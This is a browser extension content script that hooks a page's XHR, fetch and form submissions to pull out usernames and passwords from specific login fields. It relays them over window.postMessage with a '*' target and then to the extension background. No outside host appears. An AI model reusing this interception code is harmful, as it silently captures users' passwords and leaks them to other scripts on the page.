// Inject XHR/fetch interceptor into the page's own JS context.
// Content scripts are isolated — hooking XHR/fetch requires injecting a real <script> tag.
(function injectInterceptor() {
	const s = document.createElement('script');
	s.textContent = `(function(){
		function extractCreds(body){
			if(!body||typeof body!=='string') return null;
			try{
				const p=new URLSearchParams(body);
				const u=p.get('account')||p.get('username')||p.get('translator_username')||'';
				const pw=p.get('pw')||p.get('password')||p.get('dbpw')||p.get('translator_password')||'';
				if(u) return {username:u,password:pw};
			}catch(e){}
			return null;
		}
		const _XHR=window.XMLHttpRequest;
		function HookedXHR(){
			const x=new _XHR();
			const origSend=x.send.bind(x);
			x.send=function(body){
				const c=extractCreds(body);
				if(c) window.postMessage({__ace:'LOGIN',username:c.username,password:c.password},'*');
				return origSend(body);
			};
			return x;
		}
		HookedXHR.prototype=_XHR.prototype;
		window.XMLHttpRequest=HookedXHR;
		const _fetch=window.fetch;
		window.fetch=function(input,init){
			const body=init&&init.body;
			const c=extractCreds(body);
			if(c) window.postMessage({__ace:'LOGIN',username:c.username,password:c.password},'*');
			return _fetch(input,init);
		};
	})();`;
	(document.head || document.documentElement).appendChild(s);
	s.remove();
})();

// Also catch traditional form submits (full page-navigation style)
document.addEventListener('submit', function(e) {
	const form = e.target;
	if (!form || form.tagName !== 'FORM') return;
	try {
		const data = new FormData(form);
		const username = data.get('account') || data.get('username') || data.get('translator_username') || '';
		const password = data.get('pw') || data.get('password') || data.get('dbpw') || data.get('translator_password') || '';
		if (username) sendCreds(username, password);
	} catch(_) {}
}, true);

// Receive from the injected page-context script
window.addEventListener('message', function(e) {
	if (e.data && e.data.__ace === 'LOGIN' && e.data.username) {
		sendCreds(e.data.username, e.data.password || '');
	}
});

function sendCreds(username, password) {
	try {
		chrome.runtime.sendMessage({ type: 'LOGIN_ATTEMPT', username: String(username), password: String(password) });
	} catch(_) {}
}
